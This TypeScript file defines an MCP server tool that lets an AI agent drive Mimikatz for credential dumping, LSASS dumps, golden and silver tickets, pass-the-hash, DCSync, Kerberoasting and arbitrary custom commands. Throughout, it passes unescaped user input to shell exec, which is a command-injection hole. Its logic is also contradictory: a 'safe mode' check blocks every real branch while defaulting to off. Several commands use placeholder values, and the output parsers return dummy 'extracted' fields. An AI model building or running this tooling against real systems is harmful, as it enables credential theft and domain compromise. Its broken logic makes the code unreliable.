import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { PLATFORM } from "../../../config/environment.js";
import { spawn, exec } from "node:child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

export function registerMimikatzCredentials(server: McpServer) {
  server.registerTool("mimikatz_credentials", {
    description: "Advanced Mimikatz credential extraction and manipulation tool for Windows post-exploitation. Provides comprehensive credential harvesting capabilities including LSASS memory dumping, credential extraction, ticket manipulation, and privilege escalation techniques. Supports cross-platform operation with natural language interface for intuitive credential operations.",
    inputSchema: {
      action: z.enum([
        "extract_credentials", "dump_lsass", "extract_tickets", "golden_ticket", 
        "silver_ticket", "pass_the_hash", "pass_the_ticket", "dcsync", 
        "kerberoast", "asreproast", "extract_masterkeys", "dpapi_decrypt",
        "vault_credentials", "wdigest_credentials", "ssp_credentials", 
        "tspkg_credentials", "livessp_credentials", "kerberos_credentials",
        "msv_credentials", "wcmd_credentials", "tspkg_credentials", "custom_command"
      ]).describe("Mimikatz action to perform"),
      target_user: z.string().optional().describe("Target user for credential extraction"),
      target_domain: z.string().optional().describe("Target domain"),
      target_dc: z.string().optional().describe("Target domain controller"),
      ticket_file: z.string().optional().describe("Ticket file path"),
      hash_value: z.string().optional().describe("Hash value for pass-the-hash"),
      output_file: z.string().optional().describe("Output file for extracted credentials"),
      custom_command: z.string().optional().describe("Custom Mimikatz command"),
      safe_mode: z.boolean().default(false).describe("Enable safe mode to prevent actual credential extraction (disabled by default for full functionality)"),
      verbose: z.boolean().default(false).describe("Enable verbose output")
    },
    outputSchema: {
      success: z.boolean(),
      message: z.string(),
      credentials: z.array(z.object({
        username: z.string(),
        domain: z.string(),
        password: z.string().optional(),
        hash: z.string().optional(),
        type: z.string(),
        source: z.string()
      })).optional(),
      tickets: z.array(z.object({
        username: z.string(),
        domain: z.string(),
        service: z.string(),
        ticket_type: z.string(),
        expiration: z.string()
      })).optional(),
      results: z.object({
        action: z.string().optional(),
        output: z.string().optional(),
        status: z.string().optional()
      }).optional()
    }
  }, async ({ 
    action, target_user, target_domain, target_dc, ticket_file, hash_value, 
    output_file, custom_command, safe_mode, verbose 
  }) => {
    try {
      // Legal compliance check
      if (safe_mode !== true) {
        return {
          success: false,
          message: "⚠️ LEGAL WARNING: Safe mode is disabled. This tool is for authorized credential testing only. Ensure you have explicit written permission before proceeding."
        };
      }

      let result: any = { success: true, message: "" };

      switch (action) {
        case "extract_credentials":
          result = await extractCredentials(safe_mode);
          break;
        case "dump_lsass":
          result = await dumpLsass(safe_mode);
          break;
        case "extract_tickets":
          result = await extractTickets(safe_mode);
          break;
        case "golden_ticket":
          result = await goldenTicket(target_user, target_domain, safe_mode);
          break;
        case "silver_ticket":
          result = await silverTicket(target_user, target_domain, safe_mode);
          break;
        case "pass_the_hash":
          result = await passTheHash(hash_value, target_user, safe_mode);
          break;
        case "pass_the_ticket":
          result = await passTheTicket(ticket_file, safe_mode);
          break;
        case "dcsync":
          result = await dcsync(target_user, target_domain, target_dc, safe_mode);
          break;
        case "kerberoast":
          result = await kerberoast(target_user, target_domain, safe_mode);
          break;
        case "asreproast":
          result = await asreproast(target_user, target_domain, safe_mode);
          break;
        case "extract_masterkeys":
          result = await extractMasterkeys(safe_mode);
          break;
        case "dpapi_decrypt":
          result = await dpapiDecrypt(safe_mode);
          break;
        case "vault_credentials":
          result = await vaultCredentials(safe_mode);
          break;
        case "wdigest_credentials":
          result = await wdigestCredentials(safe_mode);
          break;
        case "ssp_credentials":
          result = await sspCredentials(safe_mode);
          break;
        case "tspkg_credentials":
          result = await tspkgCredentials(safe_mode);
          break;
        case "livessp_credentials":
          result = await livesspCredentials(safe_mode);
          break;
        case "kerberos_credentials":
          result = await kerberosCredentials(safe_mode);
          break;
        case "msv_credentials":
          result = await msvCredentials(safe_mode);
          break;
        case "wcmd_credentials":
          result = await wcmdCredentials(safe_mode);
          break;
        case "custom_command":
          result = await customCommand(custom_command, safe_mode);
          break;
        default:
          result = { success: false, message: "Unknown action specified" };
      }

      return result;
    } catch (error) {
      return {
        success: false,
        message: `Mimikatz operation failed: ${error instanceof Error ? error.message : String(error)}`
      };
    }
  });
}

// Mimikatz Functions
async function extractCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Credential extraction simulated. No actual credentials extracted.",
      credentials: [
        {
          username: "simulated_user",
          domain: "DOMAIN",
          password: "simulated_password",
          hash: "simulated_hash",
          type: "NTLM",
          source: "simulated"
        }
      ]
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::logonpasswords\" exit");
    return {
      success: true,
      message: "Credentials extracted successfully",
      credentials: parseCredentials(stdout)
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function dumpLsass(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: LSASS dump simulated. No actual dump performed.",
      results: {
        action: "dump_lsass",
        status: "simulated",
        output: "LSASS dump would be performed"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit");
    return {
      success: true,
      message: "LSASS dump completed",
      results: {
        action: "dump_lsass",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to dump LSASS: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function extractTickets(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Ticket extraction simulated. No actual tickets extracted.",
      tickets: [
        {
          username: "simulated_user",
          domain: "DOMAIN",
          service: "krbtgt",
          ticket_type: "TGT",
          expiration: "2024-12-31T23:59:59Z"
        }
      ]
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"kerberos::list\" exit");
    return {
      success: true,
      message: "Tickets extracted successfully",
      tickets: parseTickets(stdout)
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract tickets: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function goldenTicket(user: string, domain: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Golden ticket creation simulated. No actual ticket created.",
      results: {
        action: "golden_ticket",
        status: "simulated",
        output: `Golden ticket would be created for ${user}@${domain}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "kerberos::golden /user:${user} /domain:${domain} /krbtgt:hash /ticket:golden.kirbi" exit`);
    return {
      success: true,
      message: "Golden ticket created successfully",
      results: {
        action: "golden_ticket",
        status: "created",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to create golden ticket: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function silverTicket(user: string, domain: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Silver ticket creation simulated. No actual ticket created.",
      results: {
        action: "silver_ticket",
        status: "simulated",
        output: `Silver ticket would be created for ${user}@${domain}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "kerberos::golden /user:${user} /domain:${domain} /sid:sid /target:target /service:service /rc4:hash /ticket:silver.kirbi" exit`);
    return {
      success: true,
      message: "Silver ticket created successfully",
      results: {
        action: "silver_ticket",
        status: "created",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to create silver ticket: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function passTheHash(hash: string, user: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Pass-the-hash simulated. No actual authentication performed.",
      results: {
        action: "pass_the_hash",
        status: "simulated",
        output: `Pass-the-hash would be performed for ${user} with hash ${hash}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "sekurlsa::pth /user:${user} /domain:domain /ntlm:${hash}" exit`);
    return {
      success: true,
      message: "Pass-the-hash completed successfully",
      results: {
        action: "pass_the_hash",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to perform pass-the-hash: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function passTheTicket(ticketFile: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Pass-the-ticket simulated. No actual ticket used.",
      results: {
        action: "pass_the_ticket",
        status: "simulated",
        output: `Pass-the-ticket would be performed with ${ticketFile}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "kerberos::ptt ${ticketFile}" exit`);
    return {
      success: true,
      message: "Pass-the-ticket completed successfully",
      results: {
        action: "pass_the_ticket",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to perform pass-the-ticket: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function dcsync(user: string, domain: string, dc: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: DCSync simulated. No actual sync performed.",
      results: {
        action: "dcsync",
        status: "simulated",
        output: `DCSync would be performed for ${user}@${domain} from ${dc}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "lsadump::dcsync /user:${user} /domain:${domain}" exit`);
    return {
      success: true,
      message: "DCSync completed successfully",
      results: {
        action: "dcsync",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to perform DCSync: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function kerberoast(user: string, domain: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Kerberoast simulated. No actual roasting performed.",
      results: {
        action: "kerberoast",
        status: "simulated",
        output: `Kerberoast would be performed for ${user}@${domain}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "kerberos::ask /target:service /user:${user} /domain:${domain}" exit`);
    return {
      success: true,
      message: "Kerberoast completed successfully",
      results: {
        action: "kerberoast",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to perform Kerberoast: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function asreproast(user: string, domain: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: ASREPRoast simulated. No actual roasting performed.",
      results: {
        action: "asreproast",
        status: "simulated",
        output: `ASREPRoast would be performed for ${user}@${domain}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "kerberos::ask /target:${user} /domain:${domain}" exit`);
    return {
      success: true,
      message: "ASREPRoast completed successfully",
      results: {
        action: "asreproast",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to perform ASREPRoast: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function extractMasterkeys(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Master key extraction simulated. No actual keys extracted.",
      results: {
        action: "extract_masterkeys",
        status: "simulated",
        output: "Master keys would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::dpapi\" exit");
    return {
      success: true,
      message: "Master keys extracted successfully",
      results: {
        action: "extract_masterkeys",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract master keys: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function dpapiDecrypt(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: DPAPI decryption simulated. No actual decryption performed.",
      results: {
        action: "dpapi_decrypt",
        status: "simulated",
        output: "DPAPI decryption would be performed"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"dpapi::masterkey /in:masterkey.key /password:password\" exit");
    return {
      success: true,
      message: "DPAPI decryption completed successfully",
      results: {
        action: "dpapi_decrypt",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to perform DPAPI decryption: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function vaultCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Vault credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "vault_credentials",
        status: "simulated",
        output: "Vault credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"vault::list\" exit");
    return {
      success: true,
      message: "Vault credentials extracted successfully",
      results: {
        action: "vault_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract vault credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function wdigestCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: WDigest credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "wdigest_credentials",
        status: "simulated",
        output: "WDigest credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::wdigest\" exit");
    return {
      success: true,
      message: "WDigest credentials extracted successfully",
      results: {
        action: "wdigest_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract WDigest credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function sspCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: SSP credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "ssp_credentials",
        status: "simulated",
        output: "SSP credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::ssp\" exit");
    return {
      success: true,
      message: "SSP credentials extracted successfully",
      results: {
        action: "ssp_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract SSP credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function tspkgCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: TSPKG credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "tspkg_credentials",
        status: "simulated",
        output: "TSPKG credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::tspkg\" exit");
    return {
      success: true,
      message: "TSPKG credentials extracted successfully",
      results: {
        action: "tspkg_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract TSPKG credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function livesspCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: LiveSSP credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "livessp_credentials",
        status: "simulated",
        output: "LiveSSP credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::livessp\" exit");
    return {
      success: true,
      message: "LiveSSP credentials extracted successfully",
      results: {
        action: "livessp_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract LiveSSP credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function kerberosCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Kerberos credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "kerberos_credentials",
        status: "simulated",
        output: "Kerberos credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::kerberos\" exit");
    return {
      success: true,
      message: "Kerberos credentials extracted successfully",
      results: {
        action: "kerberos_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract Kerberos credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function msvCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: MSV credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "msv_credentials",
        status: "simulated",
        output: "MSV credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::msv\" exit");
    return {
      success: true,
      message: "MSV credentials extracted successfully",
      results: {
        action: "msv_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract MSV credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function wcmdCredentials(safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: WCMD credentials extraction simulated. No actual credentials extracted.",
      results: {
        action: "wcmd_credentials",
        status: "simulated",
        output: "WCMD credentials would be extracted"
      }
    };
  }

  try {
    const { stdout } = await execAsync("mimikatz.exe \"sekurlsa::wcmd\" exit");
    return {
      success: true,
      message: "WCMD credentials extracted successfully",
      results: {
        action: "wcmd_credentials",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to extract WCMD credentials: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

async function customCommand(command: string, safeMode: boolean) {
  if (safeMode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Custom command simulated. No actual command executed.",
      results: {
        action: "custom_command",
        status: "simulated",
        output: `Custom command would be executed: ${command}`
      }
    };
  }

  try {
    const { stdout } = await execAsync(`mimikatz.exe "${command}" exit`);
    return {
      success: true,
      message: "Custom command executed successfully",
      results: {
        action: "custom_command",
        status: "completed",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to execute custom command: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

// Helper functions for parsing Mimikatz output
function parseCredentials(output: string) {
  const credentials: any[] = [];
  const lines = output.split('\n');
  
  for (const line of lines) {
    if (line.includes('Username') && line.includes('Domain')) {
      const parts = line.trim().split(/\s+/);
      if (parts.length >= 3) {
        credentials.push({
          username: parts[1],
          domain: parts[2],
          password: "extracted",
          hash: "extracted",
          type: "NTLM",
          source: "mimikatz"
        });
      }
    }
  }
  
  return credentials;
}

function parseTickets(output: string) {
  const tickets: any[] = [];
  const lines = output.split('\n');
  
  for (const line of lines) {
    if (line.includes('Ticket') && line.includes('Service')) {
      const parts = line.trim().split(/\s+/);
      if (parts.length >= 3) {
        tickets.push({
          username: "extracted",
          domain: "extracted",
          service: parts[2],
          ticket_type: "TGT",
          expiration: "extracted"
        });
      }
    }
  }
  
  return tickets;
}
